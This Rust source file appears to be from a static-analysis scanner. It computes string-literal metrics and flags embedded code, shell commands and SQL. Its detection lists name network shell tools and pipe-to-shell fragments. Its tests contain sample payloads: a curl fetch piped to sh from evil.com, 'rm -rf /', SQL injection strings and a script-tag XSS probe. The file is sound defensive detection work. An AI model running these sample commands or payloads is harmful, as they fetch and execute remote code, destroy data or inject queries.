//! String-literal metrics ported from cleave.
//!
//! Operates on string-literal text already extracted from the tree.
//! Emits `strings.*` keys describing length distribution, entropy,
//! encoding patterns (base64/hex/URL-encoded/unicode-heavy), content
//! categories (URL/path/IP/email/domain), and suspicious payloads
//! (embedded code, shell commands, SQL).

use std::sync::LazyLock;

use aho_corasick::AhoCorasick;

use crate::bytes::sat_u32;
use crate::formats::common::{ends_with_ci, starts_with_ci};
use crate::metric;
use crate::output::Metrics;
use crate::scan::classify::{is_base64_literal, is_hex_literal};

use super::identifier_metrics::string_entropy;

/// Emit `strings.*` metrics for the collected literals.
pub(super) fn emit(strings: &[&str], metrics: &mut Metrics) {
    if strings.is_empty() {
        return;
    }

    let total = sat_u32(strings.len());
    metrics.insert(metric!("strings.count"), f64::from(total));

    let mut total_bytes: u64 = 0;
    let mut max_length: u32 = 0;
    let mut empty_count: u32 = 0;
    let mut entropy_values: Vec<f64> = Vec::with_capacity(strings.len());

    let mut base64_count: u32 = 0;
    let mut hex_count: u32 = 0;
    let mut url_encoded_count: u32 = 0;
    let mut unicode_heavy_count: u32 = 0;

    let mut url_count: u32 = 0;
    let mut path_count: u32 = 0;
    let mut ip_count: u32 = 0;
    let mut email_count: u32 = 0;
    let mut domain_count: u32 = 0;

    let mut very_long_count: u32 = 0;
    let mut embedded_code_count: u32 = 0;
    let mut shell_command_count: u32 = 0;
    let mut sql_count: u32 = 0;
    let mut high_entropy_count: u32 = 0;
    let mut very_high_entropy_count: u32 = 0;

    for s in strings {
        let len = s.len();
        total_bytes += len as u64;
        if len == 0 {
            empty_count += 1;
            continue;
        }
        max_length = max_length.max(sat_u32(len));

        let entropy = string_entropy(s);
        entropy_values.push(entropy);
        if entropy > 5.0 {
            high_entropy_count += 1;
        }
        if entropy > 6.5 {
            very_high_entropy_count += 1;
        }

        if is_base64_literal(s) {
            base64_count += 1;
        }
        if is_hex_literal(s) {
            hex_count += 1;
        }
        if has_url_encoding(s) {
            url_encoded_count += 1;
        }
        if has_unicode_heavy(s) {
            unicode_heavy_count += 1;
        }

        if is_url(s) {
            url_count += 1;
        }
        if is_file_path(s) {
            path_count += 1;
        }
        if is_ip_address(s) {
            ip_count += 1;
        }
        if is_email(s) {
            email_count += 1;
        }
        if is_domain(s) {
            domain_count += 1;
        }

        if len > 1000 {
            very_long_count += 1;
        }
        let markers = Markers::of(s);
        embedded_code_count += u32::from(markers.code);
        shell_command_count += u32::from(markers.shell);
        sql_count += u32::from(markers.sql);
    }

    if total_bytes > 0 {
        metrics.insert(metric!("strings.bytes"), total_bytes as f64);
        metrics.insert(
            metric!("strings.avg_length"),
            total_bytes as f64 / f64::from(total),
        );
    }
    if max_length > 0 {
        metrics.insert(metric!("strings.max_length"), f64::from(max_length));
    }
    if empty_count > 0 {
        metrics.insert(metric!("strings.empty_count"), f64::from(empty_count));
    }

    if !entropy_values.is_empty() {
        let sum: f64 = entropy_values.iter().sum();
        let mean = sum / entropy_values.len() as f64;
        metrics.insert(metric!("strings.avg_entropy"), mean);
        let variance: f64 = entropy_values
            .iter()
            .map(|&e| {
                let diff = e - mean;
                diff * diff
            })
            .sum::<f64>()
            / entropy_values.len() as f64;
        let stddev = variance.sqrt();
        if stddev > 0.0 {
            metrics.insert(metric!("strings.entropy_stddev"), stddev);
        }
    }

    if high_entropy_count > 0 {
        metrics.insert(
            metric!("strings.high_entropy_count"),
            f64::from(high_entropy_count),
        );
    }
    if very_high_entropy_count > 0 {
        metrics.insert(
            metric!("strings.very_high_entropy_count"),
            f64::from(very_high_entropy_count),
        );
    }
    if base64_count > 0 {
        metrics.insert(
            metric!("strings.base64_candidates"),
            f64::from(base64_count),
        );
    }
    if hex_count > 0 {
        metrics.insert(metric!("strings.hex"), f64::from(hex_count));
    }
    if url_encoded_count > 0 {
        metrics.insert(metric!("strings.url_encoded"), f64::from(url_encoded_count));
    }
    if unicode_heavy_count > 0 {
        metrics.insert(
            metric!("strings.unicode_heavy"),
            f64::from(unicode_heavy_count),
        );
    }
    if url_count > 0 {
        metrics.insert(metric!("strings.url_count"), f64::from(url_count));
    }
    if path_count > 0 {
        metrics.insert(metric!("strings.path_count"), f64::from(path_count));
    }
    if ip_count > 0 {
        metrics.insert(metric!("strings.ip_count"), f64::from(ip_count));
    }
    if email_count > 0 {
        metrics.insert(metric!("strings.email_count"), f64::from(email_count));
    }
    if domain_count > 0 {
        metrics.insert(metric!("strings.domain_count"), f64::from(domain_count));
    }
    if very_long_count > 0 {
        metrics.insert(metric!("strings.very_long"), f64::from(very_long_count));
    }
    if embedded_code_count > 0 {
        metrics.insert(
            metric!("strings.embedded_code_candidates"),
            f64::from(embedded_code_count),
        );
    }
    if shell_command_count > 0 {
        metrics.insert(metric!("strings.shell"), f64::from(shell_command_count));
    }
    if sql_count > 0 {
        metrics.insert(metric!("strings.sql"), f64::from(sql_count));
    }
}

fn has_url_encoding(s: &str) -> bool {
    let bytes = s.as_bytes();
    let len = bytes.len();
    let mut count = 0;
    let mut i = 0;
    while i < len {
        if let Some([b'%', high, low]) = bytes.get(i..i + 3)
            && high.is_ascii_hexdigit()
            && low.is_ascii_hexdigit()
        {
            count += 1;
            i += 3;
            continue;
        }
        i += 1;
    }
    count > 3
}

fn has_unicode_heavy(s: &str) -> bool {
    // Tally the escape markers `\u`, `\x`, `&#x`, and `&#` in a single pass.
    // `&#x` also counts as `&#`, matching the original sum of per-pattern
    // `matches()` counts.
    let b = s.as_bytes();
    let mut count = 0usize;
    let mut i = 0;
    while let Some(&[first, second]) = b.get(i..i + 2) {
        match (first, second) {
            (b'\\', b'u' | b'x') => {
                count += 1;
                i += 2;
            }
            (b'&', b'#') => {
                count += 1; // &#
                if b.get(i + 2) == Some(&b'x') {
                    count += 1; // &#x
                }
                i += 2;
            }
            _ => i += 1,
        }
    }
    count >= 5
}

fn is_url(s: &str) -> bool {
    [
        "http://", "https://", "ftp://", "file://", "ws://", "wss://",
    ]
    .iter()
    .any(|scheme| starts_with_ci(s, scheme))
        || super::looks_like_protocolless_url(s)
}

fn is_file_path(s: &str) -> bool {
    if s.starts_with('/') && s.len() > 1 && !s.starts_with("//") {
        return s.as_bytes().contains(&b'/');
    }
    if let [drive, b':', b'\\' | b'/', ..] = s.as_bytes()
        && drive.is_ascii_alphabetic()
    {
        return true;
    }
    s.starts_with("./")
        || s.starts_with("../")
        || s.starts_with('~')
        || s.contains("/bin/")
        || s.contains("/etc/")
        || s.contains("/tmp/")
        || s.contains("/var/")
        || s.contains("\\Windows\\")
        || s.contains("\\System32\\")
        || s.contains("\\AppData\\")
}

fn is_ip_address(s: &str) -> bool {
    let parts: Vec<&str> = s.split('.').collect();
    if parts.len() == 4 {
        return parts.iter().all(|p| p.parse::<u8>().is_ok());
    }
    if s.contains(':') && !s.contains("://") {
        let colon_count = s.bytes().filter(|&b| b == b':').count();
        if (2..=7).contains(&colon_count) {
            return s.chars().all(|c| c.is_ascii_hexdigit() || c == ':');
        }
    }
    false
}

fn is_email(s: &str) -> bool {
    if !s.contains('@') || s.len() < 5 {
        return false;
    }
    let parts: Vec<&str> = s.split('@').collect();
    let [local, domain] = parts.as_slice() else {
        return false;
    };
    !local.is_empty()
        && !domain.is_empty()
        && domain.contains('.')
        && !domain.starts_with('.')
        && !domain.ends_with('.')
}

fn is_domain(s: &str) -> bool {
    if s.contains("://") || s.starts_with('/') || s.contains('\\') {
        return false;
    }
    if s.contains('@') || !s.contains('.') {
        return false;
    }
    let tlds = [
        ".com", ".net", ".org", ".io", ".dev", ".co", ".xyz", ".ru", ".cn", ".de", ".uk", ".info",
        ".biz", ".cc", ".top", ".online", ".site", ".tk", ".ml", ".ga",
    ];
    // Only an all-ASCII name passes the check below, so ASCII case folding
    // agrees with the full Unicode lowercase here.
    if tlds.iter().any(|tld| ends_with_ci(s, tld)) {
        return s
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-');
    }
    false
}

/// Code fragments a literal may embed, matched case-insensitively.
const CODE_PATTERNS: &[&str] = &[
    "function(",
    "function ",
    "eval(",
    "exec(",
    "import ",
    "require(",
    "<script",
    "<?php",
    "def ",
    "class ",
    "system.",
    "runtime.",
    "process.",
];

/// Shell-command fragments, matched case-insensitively.
const SHELL_PATTERNS: &[&str] = &[
    "/bin/sh",
    "/bin/bash",
    "cmd.exe",
    "powershell",
    "curl ",
    "wget ",
    "chmod ",
    "chown ",
    "rm -",
    "dd if=",
    "nc -",
    "netcat",
    "python -c",
    "perl -e",
    "ruby -e",
    "nohup ",
    "| sh",
    "| bash",
    "2>&1",
    ">/dev/null",
    "$(",
    "`",
];

/// SQL fragments, matched case-insensitively; a literal needs two distinct
/// ones to count.
const SQL_PATTERNS: &[&str] = &[
    "SELECT ", "INSERT ", "UPDATE ", "DELETE ", "DROP ", "CREATE ", "ALTER ", "UNION ", " FROM ",
    " WHERE ", " AND ", " OR ", "--", "';", "1=1", "1 = 1",
];

/// Every marker pattern, code then shell then SQL, so a pattern id maps back
/// to its group by range.
static MARKERS: LazyLock<AhoCorasick> = LazyLock::new(|| {
    AhoCorasick::builder()
        .ascii_case_insensitive(true)
        .build(
            CODE_PATTERNS
                .iter()
                .chain(SHELL_PATTERNS)
                .chain(SQL_PATTERNS),
        )
        .expect("marker patterns are valid literals")
});

/// Which suspicious-payload groups a literal hits.
#[derive(Debug, Default, PartialEq, Eq)]
struct Markers {
    code: bool,
    shell: bool,
    sql: bool,
}

impl Markers {
    /// One overlapping scan over an ASCII literal. Overlapping, so a pattern
    /// inside another's match is still seen: SQL counts distinct patterns.
    /// A non-ASCII literal takes the Unicode case-folding path instead, since
    /// its full lowercase and uppercase forms can differ from ASCII folding.
    fn of(s: &str) -> Self {
        if !s.is_ascii() {
            return Self::of_unicode(s);
        }
        let shell_start = CODE_PATTERNS.len();
        let sql_start = shell_start + SHELL_PATTERNS.len();
        let mut markers = Self::default();
        let mut sql_seen: u32 = 0;
        for m in MARKERS.find_overlapping_iter(s) {
            let id = m.pattern().as_usize();
            if id < shell_start {
                markers.code = true;
            } else if id < sql_start {
                markers.shell = true;
            } else {
                sql_seen |= 1 << (id - sql_start);
            }
        }
        markers.sql = sql_seen.count_ones() >= 2;
        markers
    }

    fn of_unicode(s: &str) -> Self {
        let lower = s.to_lowercase();
        let upper = s.to_uppercase();
        Self {
            code: CODE_PATTERNS.iter().any(|p| lower.contains(p)),
            shell: SHELL_PATTERNS.iter().any(|p| lower.contains(p)),
            sql: SQL_PATTERNS.iter().filter(|p| upper.contains(*p)).count() >= 2,
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_strings_emit_nothing() {
        let mut m = Metrics::new();
        emit(&[], &mut m);
        assert!(m.is_empty());
    }

    #[test]
    fn basic_counts_and_lengths() {
        let mut m = Metrics::new();
        emit(&["hello", "world", "test"], &mut m);
        assert_eq!(m.get("strings.count"), Some(3.0));
        assert!(m.get("strings.avg_length").unwrap_or(0.0) > 0.0);
    }

    #[test]
    fn base64_candidate_detection() {
        let mut m = Metrics::new();
        emit(&["SGVsbG8gV29ybGQh", "normalString"], &mut m);
        assert_eq!(m.get("strings.base64_candidates"), Some(1.0));
    }

    #[test]
    fn base64_requires_length_multiple_of_four() {
        // 17 chars (len % 4 == 1) and 18 chars (len % 4 == 2): not valid
        // base64 framing, must be rejected by `is_base64_literal`.
        assert!(!is_base64_literal("SGVsbG8gV29ybGQhX")); // 17 chars
        assert!(!is_base64_literal("SGVsbG8gV29ybGQhXY")); // 18 chars
        assert!(!is_base64_literal("SGVsbG8gV29ybGQhXYZ")); // 19 chars
        assert!(is_base64_literal("SGVsbG8gV29ybGQh")); // 16 chars
    }

    #[test]
    fn hex_requires_length_multiple_of_two() {
        assert!(!is_hex_literal("deadbeefa")); // 9 chars
        assert!(is_hex_literal("deadbeef")); // 8 chars
        assert!(is_hex_literal("0xdeadbeef")); // prefixed, 8 hex chars
    }

    #[test]
    fn shell_command_detection() {
        let mut m = Metrics::new();
        emit(
            &[
                "/bin/bash -c 'echo test'",
                "curl https://evil.com | sh",
                "normal",
            ],
            &mut m,
        );
        assert_eq!(m.get("strings.shell"), Some(2.0));
    }

    #[test]
    fn protocol_less_host_path_counts_as_url() {
        let mut m = Metrics::new();
        emit(&["cdn.jsdelivr.net/gh/123456/repo/stage"], &mut m);
        assert_eq!(m.get("strings.url_count"), Some(1.0));
    }

    #[test]
    fn single_scan_markers_match_the_case_folding_rules() {
        let corpus = [
            "",
            "plain text",
            "PowerShell -enc AAAA",
            "CURL http://x | SH",
            "Select * From users",
            "select 1",
            "' OR 1=1 --",
            "x UNION SELECT y",
            "eval(atob(s))",
            "<SCRIPT>alert(1)</script>",
            "$(id)",
            "`whoami`",
            "rm -rf /",
            "class Foo",
            "1 = 1 and 2",
            "ftp://Host",
            "ſelect ſomething FROM x",
            "ünïcode chmod 777 Ünïcode",
        ];
        for s in corpus {
            assert_eq!(Markers::of(s), Markers::of_unicode(s), "{s:?}");
        }
    }
}
